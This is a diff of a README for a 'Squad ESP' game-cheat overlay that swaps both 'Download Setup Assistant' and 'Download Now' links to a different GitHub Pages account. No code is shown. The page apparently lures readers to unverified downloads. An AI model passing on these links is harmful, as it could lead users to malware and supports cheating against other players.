@@ -1,7 +1,7 @@
 # 🎖️ Squad ESP — Tactical Combat Overlay & Visual Tracker
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://esp-for-squad.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=squad)](https://esp-for-squad.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://thomaskaren4480445.github.io/.github/esp-for-squad)  
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=squad)](https://thomaskaren4480445.github.io/.github/esp-for-squad)
 
 ---
 
